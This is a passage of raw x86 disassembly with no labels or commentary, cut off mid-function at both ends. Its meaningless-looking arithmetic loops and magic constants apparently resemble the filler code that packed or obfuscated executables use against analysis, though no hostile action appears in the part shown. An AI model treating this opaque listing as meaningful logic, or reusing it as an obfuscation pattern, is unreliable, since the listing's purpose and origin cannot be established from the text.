  4288f3:	movzx  esi,bl
  4288f6:	lea    esi,[esi+edx*1+0x4]
  4288fa:	mov    DWORD PTR [esp+0x10],0x3c
  428902:	cmp    ecx,eax
  428904:	je     0x428934
  428906:	lea    ebp,[eax+ecx*1+0x5]
  42890a:	cmp    ebp,0x39b
  428910:	je     0x428934
  428912:	lea    edi,[eax+ebp*1+0x32]
  428916:	cmp    edi,ecx
  428918:	jne    0x42891e
  42891a:	lea    ebp,[eax+ecx*1+0x1f]
  42891e:	add    DWORD PTR [esp+0x10],0x5
  428923:	cmp    DWORD PTR [esp+0x10],0xc4f
  42892b:	movzx  eax,cl
  42892e:	lea    eax,[eax+ebp*1+0x4]
  428932:	jl     0x428902
  428934:	lea    edi,[edx+ebx*1-0x32]
  428938:	cmp    edi,0x23e
  42893e:	jb     0x428947
  428940:	mov    esi,ebx
  428942:	sub    esi,edx
  428944:	add    esi,0x2e
  428947:	add    edx,eax
  428949:	xor    edi,edi
  42894b:	lea    ebp,[edx+ebp*1+0x3ef9]
  428952:	lea    edx,[ebx-0x3222]
  428958:	sub    edx,esi
  42895a:	push   edi
  42895b:	pop    esi
  42895c:	sbb    edi,esi
  42895e:	lea    esi,[ecx+ebp*1-0x32]
  428962:	cmp    esi,0x23e
  428968:	mov    DWORD PTR ds:0x43e098,edx
  42896e:	mov    DWORD PTR ds:0x43e09c,edi
  428974:	jb     0x42897d
  428976:	mov    eax,ecx
  428978:	sub    eax,ebp
  42897a:	add    eax,0x2e
  42897d:	mov    edi,eax
  42897f:	imul   edi,edi,0x5c
  428982:	mov    esi,ebx
  428984:	sub    esi,edx
  428986:	add    esi,0x2e
  428989:	cmp    ecx,edi
  42898b:	je     0x428996
  42898d:	mov    edi,ecx
  42898f:	sub    edi,eax
  428991:	add    edi,0x2e
  428994:	jmp    0x42899a
  428996:	lea    edi,[eax+ecx*1+0x4]
  42899a:	and    DWORD PTR [esp+0x14],0x0
  42899f:	mov    DWORD PTR [esp+0x10],esi
  4289a3:	add    DWORD PTR [esp+0x10],edx
  4289a7:	mov    edx,DWORD PTR [esp+0x14]
  4289ab:	mov    ebp,DWORD PTR [esp+0x10]
  4289af:	adc    edx,DWORD PTR ds:0x43e09c
  4289b5:	add    ebp,0x32
  4289b8:	adc    edx,0x0
  4289bb:	cmp    ebp,ebx
  4289bd:	jne    0x4289cf
  4289bf:	xor    ebp,ebp
  4289c1:	cmp    edx,ebp
  4289c3:	jne    0x4289cf
  4289c5:	mov    edx,DWORD PTR ds:0x43e098
  4289cb:	lea    esi,[edx+ebx*1+0x1f]
  4289cf:	movzx  edx,si
  4289d2:	sub    edx,eax
  4289d4:	movzx  eax,bl
  4289d7:	add    edx,edi
  4289d9:	lea    eax,[eax+esi*1+0x4]
  4289dd:	mov    DWORD PTR ds:0x43e07c,edx
  4289e3:	mov    ds:0x43e098,eax
  4289e8:	push   0x48
  4289ea:	xor    edx,edx
  4289ec:	mov    eax,edi
  4289ee:	pop    ebp
  4289ef:	div    ebp
  4289f1:	and    DWORD PTR ds:0x43e09c,0x0
  4289f8:	cmp    eax,0x65
  4289fb:	jbe    0x428a0b
  4289fd:	mov    eax,ds:0x43e07c
  428a02:	add    eax,ecx
  428a04:	lea    edi,[edi+eax*1+0x3ef9]
  428a0b:	push   0x48
  428a0d:	xor    edx,edx
  428a0f:	mov    eax,esi
  428a11:	pop    ebp
  428a12:	div    ebp
  428a14:	cmp    eax,0x65
  428a17:	jbe    0x428a27
  428a19:	mov    eax,ds:0x43e098
  428a1e:	add    eax,ebx
  428a20:	lea    esi,[esi+eax*1+0x3ef9]
  428a27:	movzx  esi,si
  428a2a:	sub    esi,DWORD PTR ds:0x43e07c
  428a30:	mov    eax,ebx
  428a32:	sub    eax,DWORD PTR ds:0x43e098
  428a38:	add    esi,edi
  428a3a:	movzx  edi,bl
  428a3d:	add    eax,0x2e
  428a40:	lea    edi,[edi+eax*1-0xe]
  428a44:	lea    edx,[esi+eax*1+0x4]
  428a48:	mov    DWORD PTR ds:0x43e098,edi
  428a4e:	mov    DWORD PTR [esp+0x10],0x3c
  428a56:	cmp    ecx,esi
  428a58:	je     0x428a88
  428a5a:	lea    edx,[esi+ecx*1+0x5]
  428a5e:	cmp    edx,0x39b
  428a64:	je     0x428a88
  428a66:	lea    ebp,[edx+esi*1+0x32]
  428a6a:	cmp    ebp,ecx
  428a6c:	jne    0x428a72
  428a6e:	lea    edx,[esi+ecx*1+0x1f]
  428a72:	add    DWORD PTR [esp+0x10],0x5
  428a77:	cmp    DWORD PTR [esp+0x10],0xc4f
  428a7f:	movzx  esi,cl
  428a82:	lea    esi,[esi+edx*1+0x4]
  428a86:	jl     0x428a56
  428a88:	mov    DWORD PTR [esp+0x10],0x3c
  428a90:	cmp    ebx,edi
  428a92:	jne    0x428aa2
  428a94:	xor    ebp,ebp
  428a96:	xor    edi,edi
  428a98:	cmp    ebp,edi
  428a9a:	je     0x428afc
  428a9c:	mov    edi,DWORD PTR ds:0x43e098
  428aa2:	lea    eax,[edi+ebx*1+0x5]
  428aa6:	cmp    eax,0x39b
  428aab:	je     0x428afc
  428aad:	and    DWORD PTR [esp+0x1c],0x0
  428ab2:	mov    DWORD PTR [esp+0x18],eax
  428ab6:	add    DWORD PTR [esp+0x18],edi
  428aba:	mov    edi,DWORD PTR [esp+0x1c]
  428abe:	push   0x0
  428ac0:	pop    ebp
  428ac1:	adc    edi,ebp
  428ac3:	mov    ebp,DWORD PTR [esp+0x18]
  428ac7:	add    ebp,0x32
  428aca:	adc    edi,0x0
  428acd:	cmp    ebp,ebx
  428acf:	jne    0x428ae0
  428ad1:	xor    ebp,ebp
  428ad3:	cmp    edi,ebp
  428ad5:	jne    0x428ae0
  428ad7:	mov    eax,ds:0x43e098
  428adc:	lea    eax,[eax+ebx*1+0x1f]
  428ae0:	add    DWORD PTR [esp+0x10],0x5
  428ae5:	cmp    DWORD PTR [esp+0x10],0xc4f
  428aed:	movzx  edi,bl
  428af0:	lea    edi,[edi+eax*1+0x4]
  428af4:	mov    DWORD PTR ds:0x43e098,edi
  428afa:	jl     0x428a90
  428afc:	and    DWORD PTR ds:0x43e09c,0x0
  428b03:	lea    edi,[esi+eax*1]
  428b06:	lea    edx,[edx+edi*1+0x3ef9]
  428b0d:	movzx  edi,bl
  428b10:	lea    edi,[edi+eax*1-0xe]
  428b14:	mov    DWORD PTR ds:0x43e098,edi
  428b1a:	mov    DWORD PTR [esp+0x10],0x3c
  428b22:	cmp    ecx,esi
  428b24:	je     0x428b54
  428b26:	lea    edx,[esi+ecx*1+0x5]
  428b2a:	cmp    edx,0x39b
  428b30:	je     0x428b54
  428b32:	lea    ebp,[edx+esi*1+0x32]
  428b36:	cmp    ebp,ecx
  428b38:	jne    0x428b3e
  428b3a:	lea    edx,[esi+ecx*1+0x1f]
  428b3e:	add    DWORD PTR [esp+0x10],0x5
  428b43:	cmp    DWORD PTR [esp+0x10],0xc4f
  428b4b:	movzx  esi,cl
  428b4e:	lea    esi,[esi+edx*1+0x4]
  428b52:	jl     0x428b22
  428b54:	movzx  eax,al
  428b57:	lea    ebx,[edi+ebx*1+0x1f]
  428b5b:	lea    esi,[eax+edx*1-0xe]
  428b5f:	mov    DWORD PTR ds:0x43e05c,ebx
  428b65:	mov    eax,0x9b9
  428b6a:	dec    edx
  428b6b:	je     0x428b80
  428b6d:	sub    edx,0x12
  428b70:	je     0x428b7b
  428b72:	push   0x5c
  428b74:	pop    edx
  428b75:	sub    edx,esi
  428b77:	mov    esi,edx
  428b79:	jmp    0x428b8e
  428b7b:	lea    esi,[ecx+0x18]
  428b7e:	jmp    0x428b8e
  428b80:	movzx  edx,si
  428b83:	sub    edx,ecx
  428b85:	inc    edx
  428b86:	mov    DWORD PTR ds:0x43e058,edx
  428b8c:	mov    ecx,edx
  428b8e:	lea    edx,[esi+ecx*1+0x5]
  428b92:	cmp    ecx,edx
  428b94:	jne    0x428bac
  428b96:	mov    edx,esi
  428b98:	imul   edx,edx,0x5c
  428b9b:	cmp    ecx,edx
  428b9d:	je     0x428ba8
  428b9f:	mov    edx,ecx
  428ba1:	sub    edx,esi
  428ba3:	add    edx,0x2e
  428ba6:	jmp    0x428bac
  428ba8:	lea    edx,[esi+ecx*1+0x4]
  428bac:	lea    edi,[edx+esi*1+0x32]
  428bb0:	cmp    edi,ecx
  428bb2:	jne    0x428bb8
  428bb4:	lea    edx,[esi+ecx*1+0x1f]
  428bb8:	dec    eax
  428bb9:	jne    0x428b6a
  428bbb:	movzx  eax,bl
  428bbe:	lea    eax,[eax+edx*1+0x4]
  428bc2:	pop    edi
  428bc3:	mov    ds:0x43e07c,eax
  428bc8:	add    eax,ebx
  428bca:	pop    esi
  428bcb:	lea    eax,[edx+eax*1+0x3ef9]
  428bd2:	pop    ebp
  428bd3:	mov    ds:0x43e094,eax
  428bd8:	pop    ebx
  428bd9:	add    esp,0x18
  428bdc:	ret    
  428bdd:	push   ecx
  428bde:	push   ecx
  428bdf:	mov    edx,DWORD PTR ds:0x43e058
  428be5:	push   ebx
  428be6:	push   ebp
  428be7:	mov    ebp,DWORD PTR ds:0x43e098
  428bed:	push   esi
  428bee:	mov    ebx,eax
  428bf0:	mov    eax,ds:0x43e07c
  428bf5:	push   edi
  428bf6:	mov    edi,DWORD PTR ds:0x43e094
  428bfc:	lea    esi,[edi+eax*1+0x32]
  428c00:	cmp    esi,edx
  428c02:	lea    ecx,[ebx+ebp*1+0x4]
  428c06:	mov    DWORD PTR [esp+0x10],ecx
  428c0a:	jne    0x428c10
  428c0c:	lea    edi,[edx+eax*1+0x1f]
  428c10:	xor    edx,edx
  428c12:	xor    esi,esi
  428c14:	mov    eax,ecx
  428c16:	add    eax,ebp
  428c18:	adc    edx,DWORD PTR ds:0x43e09c
  428c1e:	add    eax,0x32
  428c21:	adc    edx,esi
  428c23:	cmp    eax,ebx
  428c25:	jne    0x428c2f
  428c27:	cmp    edx,esi
  428c29:	jne    0x428c2f
  428c2b:	lea    ecx,[ebx+ebp*1+0x1f]
  428c2f:	push   0x0
  428c31:	push   0x5c
  428c33:	push   DWORD PTR ds:0x43e09c
  428c39:	movzx  eax,cl
  428c3c:	push   ebp
  428c3d:	lea    esi,[eax+edi*1+0x4]
  428c41:	call   0x437b80
  428c46:	cmp    ebx,eax
  428c48:	jne    0x428c50
  428c4a:	xor    eax,eax
  428c4c:	cmp    eax,edx
  428c4e:	je     0x428c59
  428c50:	mov    eax,ebx
  428c52:	sub    eax,ebp
  428c54:	add    eax,0x2e
  428c57:	jmp    0x428c5d
  428c59:	mov    eax,DWORD PTR [esp+0x10]
  428c5d:	movzx  ebp,bl
  428c60:	lea    ecx,[esi+eax*1]
  428c63:	lea    ecx,[edi+ecx*1+0x3ef9]
  428c6a:	lea    ebp,[eax+ebp*1-0xe]
  428c6e:	mov    DWORD PTR [esp+0x10],0x9b9
  428c76:	dec    ecx
  428c77:	je     0x428c92
  428c79:	sub    ecx,0x12
  428c7c:	mov    edx,DWORD PTR ds:0x43e058
  428c82:	je     0x428c8d
  428c84:	push   0x5c
  428c86:	pop    ecx
  428c87:	sub    ecx,esi
  428c89:	mov    esi,ecx
  428c8b:	jmp    0x428ca4
  428c8d:	lea    esi,[edx+0x18]
  428c90:	jmp    0x428ca4
  428c92:	movzx  ecx,si
  428c95:	sub    ecx,DWORD PTR ds:0x43e058
  428c9b:	inc    ecx
  428c9c:	mov    DWORD PTR ds:0x43e058,ecx
  428ca2:	mov    edx,ecx
  428ca4:	lea    edi,[edx+esi*1]
  428ca7:	lea    ecx,[edi+0x5]
  428caa:	cmp    edx,ecx
  428cac:	jne    0x428cc3
  428cae:	mov    ecx,esi
  428cb0:	imul   ecx,ecx,0x5c
  428cb3:	cmp    edx,ecx
  428cb5:	je     0x428cc0
  428cb7:	mov    ecx,edx
  428cb9:	sub    ecx,esi
  428cbb:	add    ecx,0x2e
  428cbe:	jmp    0x428cc3
  428cc0:	lea    ecx,[edi+0x4]
  428cc3:	lea    edx,[ecx+esi*1+0x32]
  428cc7:	cmp    edx,DWORD PTR ds:0x43e058
  428ccd:	jne    0x428cd2
  428ccf:	lea    ecx,[edi+0x1f]
  428cd2:	dec    DWORD PTR [esp+0x10]
  428cd6:	jne    0x428c76
  428cd8:	lea    eax,[esi+eax*1+0x1f]
  428cdc:	push   0x48
  428cde:	xor    edx,edx
  428ce0:	pop    edi
  428ce1:	mov    ds:0x43e094,eax
  428ce6:	div    edi
  428ce8:	mov    ecx,ebx
  428cea:	sub    ecx,ebp
  428cec:	add    ecx,0x2e
  428cef:	cmp    eax,0x65
  428cf2:	jbe    0x428d0a
  428cf4:	mov    eax,ds:0x43e058
  428cf9:	mov    edx,DWORD PTR ds:0x43e094
  428cff:	add    eax,esi
  428d01:	lea    edi,[edx+eax*1+0x3ef9]
  428d08:	jmp    0x428d10
  428d0a:	mov    edi,DWORD PTR ds:0x43e094
  428d10:	mov    DWORD PTR [esp+0x10],0x3c
  428d18:	cmp    ebx,ebp
  428d1a:	jne    0x428d24
  428d1c:	xor    eax,eax
  428d1e:	xor    edx,edx
  428d20:	cmp    edx,eax
  428d22:	je     0x428d64
  428d24:	lea    ecx,[ebx+ebp*1+0x5]
  428d28:	cmp    ecx,0x39b
  428d2e:	je     0x428d64
  428d30:	xor    edx,edx
  428d32:	push   edx
  428d33:	mov    eax,ecx
  428d35:	add    eax,ebp
  428d37:	pop    esi
  428d38:	adc    edx,esi
  428d3a:	add    eax,0x32
  428d3d:	adc    edx,0x0
  428d40:	cmp    eax,ebx
  428d42:	jne    0x428d4e
  428d44:	xor    eax,eax
  428d46:	cmp    edx,eax
  428d48:	jne    0x428d4e
  428d4a:	lea    ecx,[ebx+ebp*1+0x1f]
  428d4e:	add    DWORD PTR [esp+0x10],0x5
  428d53:	cmp    DWORD PTR [esp+0x10],0xc4f
  428d5b:	movzx  ebp,bl
  428d5e:	lea    ebp,[ecx+ebp*1+0x4]
  428d62:	jl     0x428d18
  428d64:	movzx  eax,cl
  428d67:	lea    eax,[eax+edi*1-0xe]
  428d6b:	mov    ds:0x43e07c,eax
  428d70:	lea    ecx,[ebx+ebp*1+0x4]
  428d74:	push   0x48
  428d76:	xor    edx,edx
  428d78:	mov    eax,ecx
  428d7a:	pop    esi
  428d7b:	div    esi
  428d7d:	cmp    eax,0x65
  428d80:	jbe    0x428d8c
  428d82:	lea    eax,[ebx+ebp*1]
  428d85:	lea    ecx,[ecx+eax*1+0x3ef9]
  428d8c:	push   0x48
  428d8e:	xor    edx,edx
  428d90:	mov    eax,ecx
  428d92:	pop    esi
  428d93:	div    esi
  428d95:	cmp    eax,0x65
  428d98:	jbe    0x428da4
  428d9a:	lea    eax,[ebx+ebp*1]
  428d9d:	lea    ecx,[ecx+eax*1+0x3ef9]
  428da4:	movzx  eax,bx
  428da7:	cdq    
  428da8:	mov    esi,eax
  428daa:	sub    esi,ebp
  428dac:	push   0x0
  428dae:	pop    eax
  428daf:	mov    edi,edx
  428db1:	sbb    edi,eax
  428db3:	add    esi,ecx
  428db5:	adc    edi,eax
  428db7:	mov    eax,ds:0x43e07c
  428dbc:	lea    eax,[eax+ecx*1+0x1f]
  428dc0:	dec    eax
  428dc1:	je     0x428de2
  428dc3:	sub    eax,0x12
  428dc6:	je     0x428dd8
  428dc8:	push   0x5c
  428dca:	pop    eax
  428dcb:	sub    eax,DWORD PTR ds:0x43e07c
  428dd1:	mov    ds:0x43e07c,eax
  428dd6:	jmp    0x428df5
  428dd8:	mov    eax,ds:0x43e058
  428ddd:	add    eax,0x18
  428de0:	jmp    0x428dd1
  428de2:	movzx  eax,WORD PTR ds:0x43e07c
  428de9:	sub    eax,DWORD PTR ds:0x43e058
  428def:	inc    eax
  428df0:	mov    ds:0x43e058,eax
  428df5:	mov    eax,ecx
  428df7:	dec    eax
  428df8:	je     0x428e23
  428dfa:	sub    eax,0x12
  428dfd:	je     0x428e1c
  428dff:	xor    ebp,ebp
  428e01:	lea    eax,[ecx+0x2e]
  428e04:	push   ebp
  428e05:	mov    edx,eax
  428e07:	sub    edx,ecx
  428e09:	pop    eax
  428e0a:	sbb    ebp,eax
  428e0c:	sub    edx,esi
  428e0e:	sbb    ebp,edi
  428e10:	add    edx,0x2e
  428e13:	adc    ebp,0x0
  428e16:	mov    esi,edx
  428e18:	mov    edi,ebp
  428e1a:	jmp    0x428e2b
  428e1c:	lea    esi,[ebx+0x18]
  428e1f:	xor    edi,edi
  428e21:	jmp    0x428e2b
  428e23:	movzx  eax,si
  428e26:	sub    eax,ebx
  428e28:	inc    eax
  428e29:	mov    ebx,eax
  428e2b:	lea    eax,[esi+ebx*1+0x1f]
  428e2f:	mov    ds:0x43e05c,eax
  428e34:	mov    DWORD PTR [esp+0x10],0x9b9
  428e3c:	mov    ecx,eax
  428e3e:	dec    ecx
  428e3f:	je     0x428e6b
  428e41:	sub    ecx,0x12
  428e44:	je     0x428e64
  428e46:	xor    ecx,ecx
  428e48:	add    eax,0x2e
  428e4b:	xor    edx,edx
  428e4d:	sub    eax,DWORD PTR ds:0x43e05c
  428e53:	sbb    ecx,edx
  428e55:	sub    eax,esi
  428e57:	sbb    ecx,edi
  428e59:	add    eax,0x2e
  428e5c:	adc    ecx,edx
  428e5e:	mov    esi,eax
  428e60:	mov    edi,ecx
  428e62:	jmp    0x428e73
  428e64:	lea    esi,[ebx+0x18]
  428e67:	xor    edi,edi
  428e69:	jmp    0x428e73
  428e6b:	movzx  eax,si
  428e6e:	sub    eax,ebx
  428e70:	inc    eax
  428e71:	mov    ebx,eax
  428e73:	lea    eax,[esi+ebx*1+0x5]
  428e77:	cmp    ebx,eax
  428e79:	mov    ds:0x43e05c,eax
  428e7e:	jne    0x428ea7
  428e80:	push   0x0
  428e82:	push   0x5c
  428e84:	push   edi
  428e85:	push   esi
  428e86:	call   0x437b80
  428e8b:	xor    ecx,ecx
  428e8d:	cmp    ebx,eax
  428e8f:	jne    0x428e95
  428e91:	cmp    ecx,edx
  428e93:	je     0x428e9e
  428e95:	mov    eax,ebx
  428e97:	sub    eax,esi
  428e99:	add    eax,0x2e
  428e9c:	jmp    0x428ea2
  428e9e:	lea    eax,[esi+ebx*1+0x4]
  428ea2:	mov    ds:0x43e05c,eax
  428ea7:	xor    edx,edx
  428ea9:	mov    ecx,eax
  428eab:	add    ecx,esi
  428ead:	adc    edx,edi
  428eaf:	add    ecx,0x32
  428eb2:	adc    edx,0x0
  428eb5:	xor    ebp,ebp
  428eb7:	cmp    ecx,ebx
  428eb9:	jne    0x428ec8
  428ebb:	cmp    edx,ebp
  428ebd:	jne    0x428ec8
  428ebf:	lea    eax,[esi+ebx*1+0x1f]
  428ec3:	mov    ds:0x43e05c,eax
  428ec8:	dec    DWORD PTR [esp+0x10]
  428ecc:	jne    0x428e3c
  428ed2:	mov    ecx,eax
  428ed4:	sub    ecx,DWORD PTR ds:0x43e07c
  428eda:	lea    edx,[esi+ebx*1]
  428edd:	add    ecx,0x2e
  428ee0:	lea    eax,[eax+edx*1+0x3ef9]
  428ee7:	mov    edx,DWORD PTR ds:0x43e058
  428eed:	lea    ebp,[edx+ecx*1-0x32]
  428ef1:	cmp    ebp,0x23e
  428ef7:	jb     0x428f04
  428ef9:	sub    edx,ecx
  428efb:	add    edx,0x2e
  428efe:	mov    DWORD PTR ds:0x43e07c,edx
  428f04:	xor    ebp,ebp
  428f06:	mov    edx,eax
  428f08:	add    edx,esi
  428f0a:	adc    ebp,edi
  428f0c:	add    edx,0x32
  428f0f:	adc    ebp,0x0
  428f12:	cmp    edx,ebx
  428f14:	jne    0x428f20
  428f16:	xor    edx,edx
  428f18:	cmp    ebp,edx
  428f1a:	jne    0x428f20
  428f1c:	lea    eax,[esi+ebx*1+0x1f]
  428f20:	push   0x0
  428f22:	movzx  ebp,ax
  428f25:	sub    ebp,DWORD PTR ds:0x43e07c
  428f2b:	push   0x5c
  428f2d:	push   edi
  428f2e:	push   esi
  428f2f:	add    ebp,ecx
  428f31:	call   0x437b80
  428f36:	cmp    ebx,eax
  428f38:	jne    0x428f40
  428f3a:	xor    eax,eax
  428f3c:	cmp    eax,edx
  428f3e:	je     0x428f49
  428f40:	mov    eax,ebx
  428f42:	sub    eax,esi
  428f44:	add    eax,0x2e
  428f47:	jmp    0x428f4d
  428f49:	lea    eax,[esi+ebx*1+0x4]
  428f4d:	lea    ecx,[eax+ebp*1+0x1f]
  428f51:	xor    ebp,ebp
  428f53:	lea    eax,[esi+ebx*1+0x1f]
  428f57:	mov    edx,eax
  428f59:	add    edx,esi
  428f5b:	adc    ebp,edi
  428f5d:	add    edx,0x32
  428f60:	adc    ebp,0x0
  428f63:	cmp    edx,ebx
  428f65:	jne    0x428f69
  428f67:	xor    edx,edx
  428f69:	movzx  edx,al
  428f6c:	lea    edx,[edx+ecx*1+0x4]
  428f70:	mov    DWORD PTR ds:0x43e07c,edx
  428f76:	xor    edx,edx
  428f78:	lea    ebp,[ebx-0x3222]
  428f7e:	sub    ebp,esi
  428f80:	sbb    edx,edi
  428f82:	mov    edi,DWORD PTR ds:0x43e058
  428f88:	lea    esi,[edi+ecx*1-0x32]
  428f8c:	cmp    esi,0x23e
  428f92:	jb     0x428f9b
  428f94:	sub    edi,ecx
  428f96:	add    edi,0x2e
  428f99:	jmp    0x428fa1
  428f9b:	mov    edi,DWORD PTR ds:0x43e07c
  428fa1:	lea    esi,[edi+eax*1+0x1f]
  428fa5:	lea    eax,[ebx+ebp*1]
  428fa8:	mov    DWORD PTR [esp+0x10],eax
  428fac:	mov    ecx,esi
  428fae:	add    eax,0x5
  428fb1:	dec    ecx
  428fb2:	jne    0x428fc8
  428fb4:	movzx  esi,di
  428fb7:	sub    esi,DWORD PTR ds:0x43e058
  428fbd:	inc    esi
  428fbe:	mov    DWORD PTR ds:0x43e058,esi
  428fc4:	lea    esi,[esi+edi*1+0x1f]
  428fc8:	xor    edi,edi
  428fca:	mov    ecx,eax
  428fcc:	add    ecx,ebp
  428fce:	adc    edi,edx
  428fd0:	add    ecx,0x32
  428fd3:	adc    edi,0x0
  428fd6:	cmp    ecx,ebx
  428fd8:	jne    0x428fe7
  428fda:	xor    ecx,ecx
  428fdc:	cmp    edi,ecx
  428fde:	jne    0x428fe7
  428fe0:	mov    eax,DWORD PTR [esp+0x10]
  428fe4:	add    eax,0x1f
  428fe7:	push   0x0
  428fe9:	movzx  eax,al
  428fec:	push   0x5c
  428fee:	push   edx
  428fef:	lea    eax,[eax+esi*1-0xe]
  428ff3:	push   ebp
  428ff4:	mov    ds:0x43e07c,eax
  428ff9:	call   0x437b80
  428ffe:	cmp    ebx,eax
  429000:	jne    0x429008
  429002:	xor    eax,eax
  429004:	cmp    eax,edx
  429006:	je     0x429011
  429008:	mov    ecx,ebx
  42900a:	sub    ecx,ebp
  42900c:	add    ecx,0x2e
  42900f:	jmp    0x429018
  429011:	mov    ecx,DWORD PTR [esp+0x10]
  429015:	add    ecx,0x4
  429018:	movzx  edi,cx
  42901b:	sub    edi,DWORD PTR ds:0x43e07c
  429021:	movzx  eax,bl
  429024:	add    edi,esi
  429026:	mov    DWORD PTR ds:0x43e07c,edi
  42902c:	lea    eax,[eax+ecx*1-0xe]
  429030:	xor    ebp,ebp
  429032:	mov    DWORD PTR [esp+0x10],0x3c
  42903a:	cmp    ebx,eax
  42903c:	jne    0x429044
  42903e:	xor    edx,edx
  429040:	cmp    edx,ebp
  429042:	je     0x429084
  429044:	lea    ecx,[eax+ebx*1+0x5]
  429048:	cmp    ecx,0x39b
  42904e:	je     0x429084
  429050:	xor    esi,esi
  429052:	mov    edx,ecx
  429054:	add    edx,eax
  429056:	adc    esi,ebp
  429058:	push   0x0
  42905a:	add    edx,0x32
  42905d:	pop    ebp
  42905e:	adc    esi,ebp
  429060:	cmp    edx,ebx
  429062:	jne    0x42906e
  429064:	xor    edx,edx
  429066:	cmp    esi,edx
  429068:	jne    0x42906e
  42906a:	lea    ecx,[eax+ebx*1+0x1f]
  42906e:	add    DWORD PTR [esp+0x10],0x5
  429073:	cmp    DWORD PTR [esp+0x10],0xc4f
  42907b:	movzx  eax,bl
  42907e:	lea    eax,[eax+ecx*1+0x4]
  429082:	jl     0x42903a
  429084:	lea    esi,[edi+ecx*1+0x5]
  429088:	mov    edx,ebx
  42908a:	sub    edx,eax
  42908c:	mov    ecx,esi
  42908e:	add    edx,0x2e
  429091:	dec    ecx
  429092:	je     0x429099
  429094:	sub    ecx,0x12
  429097:	jmp    0x4290b3
  429099:	mov    esi,DWORD PTR ds:0x43e07c
  42909f:	movzx  ecx,di
  4290a2:	sub    ecx,DWORD PTR ds:0x43e058
  4290a8:	inc    ecx
  4290a9:	mov    DWORD PTR ds:0x43e058,ecx
  4290af:	lea    esi,[ecx+esi*1+0x1f]
  4290b3:	and    DWORD PTR [esp+0x14],0x0
  4290b8:	mov    edi,DWORD PTR [esp+0x14]
  4290bc:	mov    ecx,DWORD PTR ds:0x43e058
  4290c2:	mov    DWORD PTR [esp+0x10],edx
  4290c6:	add    DWORD PTR [esp+0x10],eax
  4290ca:	adc    edi,ebp
  4290cc:	mov    ebp,DWORD PTR [esp+0x10]
  4290d0:	add    ebp,0x32
  4290d3:	adc    edi,0x0
  4290d6:	cmp    ebp,ebx
  4290d8:	jne    0x4290e4
  4290da:	xor    ebp,ebp
  4290dc:	cmp    edi,ebp
  4290de:	jne    0x4290e4
  4290e0:	lea    edx,[eax+ebx*1+0x1f]
  4290e4:	movzx  edi,dl
  4290e7:	lea    edi,[edi+esi*1-0xe]
  4290eb:	lea    esi,[eax+ebx*1]
  4290ee:	lea    edx,[edx+esi*1+0x3ef9]
  4290f5:	mov    DWORD PTR ds:0x43e05c,edx
  4290fb:	mov    DWORD PTR [esp+0x10],0x3c
  429103:	cmp    ecx,edi
  429105:	je     0x429135
  429107:	lea    esi,[ecx+edi*1+0x5]
  42910b:	cmp    esi,0x39b
  429111:	je     0x429135
  429113:	lea    ebp,[esi+edi*1+0x32]
  429117:	cmp    ebp,ecx
  429119:	jne    0x42911f
  42911b:	lea    esi,[ecx+edi*1+0x1f]
  42911f:	add    DWORD PTR [esp+0x10],0x5
  429124:	cmp    DWORD PTR [esp+0x10],0xc4f
  42912c:	movzx  edi,cl
  42912f:	lea    edi,[edi+esi*1+0x4]
  429133:	jl     0x429103
  429135:	mov    esi,edx
  429137:	dec    esi
  429138:	je     0x42916f
  42913a:	sub    esi,0x12
  42913d:	je     0x429163
  42913f:	xor    esi,esi
  429141:	xor    ebp,ebp
  429143:	add    edx,0x2e
  429146:	sub    edx,DWORD PTR ds:0x43e05c
  42914c:	push   ebp
  42914d:	sbb    esi,ebp
  42914f:	sub    edx,eax
  429151:	pop    eax
  429152:	sbb    esi,eax
  429154:	add    edx,0x2e
  429157:	adc    esi,ebp
  429159:	mov    eax,edx
  42915b:	mov    DWORD PTR ds:0x43e09c,esi
  429161:	jmp    0x429177
  429163:	and    DWORD PTR ds:0x43e09c,0x0
  42916a:	lea    eax,[ebx+0x18]
  42916d:	jmp    0x429177
  42916f:	movzx  edx,ax
  429172:	sub    edx,ebx
  429174:	inc    edx
  429175:	mov    ebx,edx
  429177:	lea    edx,[eax+ebx*1+0x1f]
  42917b:	mov    esi,edx
  42917d:	dec    esi
  42917e:	jne    0x42918c
  429180:	movzx  edx,ax
  429183:	sub    edx,ebx
  429185:	inc    edx
  429186:	mov    ebx,edx
  429188:	lea    edx,[eax+ebx*1+0x1f]
  42918c:	and    DWORD PTR ds:0x43e09c,0x0
  429193:	movzx  ebp,bl
  429196:	lea    eax,[edx+ebx*1-0x32]
  42919a:	cmp    eax,0x23e
  42919f:	lea    esi,[edx+ebp*1+0x4]
  4291a3:	jb     0x4291b3
  4291a5:	mov    esi,ebx
  4291a7:	sub    esi,edx
  4291a9:	add    esi,0x2e
  4291ac:	and    DWORD PTR ds:0x43e09c,0x0
  4291b3:	lea    eax,[edi+edx*1+0x5]
  4291b7:	lea    edx,[esi+ebx*1+0x5]
  4291bb:	lea    esi,[ecx+eax*1-0x32]
  4291bf:	cmp    esi,0x23e
  4291c5:	jb     0x4291ce
  4291c7:	mov    edi,ecx
  4291c9:	sub    edi,eax
  4291cb:	add    edi,0x2e
  4291ce:	mov    esi,edx
  4291d0:	sub    esi,edi
  4291d2:	sub    esi,0x3222
  4291d8:	mov    DWORD PTR [esp+0x10],0x9b9
  4291e0:	dec    eax
  4291e1:	je     0x4291f6
  4291e3:	sub    eax,0x12
  4291e6:	je     0x4291f1
  4291e8:	push   0x5c
  4291ea:	pop    eax
  4291eb:	sub    eax,esi
  4291ed:	mov    esi,eax
  4291ef:	jmp    0x429203
  4291f1:	lea    esi,[ecx+0x18]
  4291f4:	jmp    0x429203
  4291f6:	movzx  eax,si
  4291f9:	sub    eax,ecx
  4291fb:	inc    eax
  4291fc:	mov    ds:0x43e058,eax
  429201:	mov    ecx,eax
  429203:	lea    eax,[ecx+esi*1+0x5]
  429207:	cmp    ecx,eax
  429209:	jne    0x429221
  42920b:	mov    eax,esi
  42920d:	imul   eax,eax,0x5c
  429210:	cmp    ecx,eax
  429212:	je     0x42921d
  429214:	mov    eax,ecx
  429216:	sub    eax,esi
  429218:	add    eax,0x2e
  42921b:	jmp    0x429221
  42921d:	lea    eax,[ecx+esi*1+0x4]
  429221:	lea    edi,[eax+esi*1+0x32]
  429225:	cmp    edi,ecx
  429227:	jne    0x42922d
  429229:	lea    eax,[ecx+esi*1+0x1f]
  42922d:	dec    DWORD PTR [esp+0x10]
  429231:	jne    0x4291e0
  429233:	lea    edi,[edx+ebp*1+0x4]
  429237:	xor    edx,edx
  429239:	dec    eax
  42923a:	mov    DWORD PTR ds:0x43e098,edi
  429240:	je     0x429255
  429242:	sub    eax,0x12
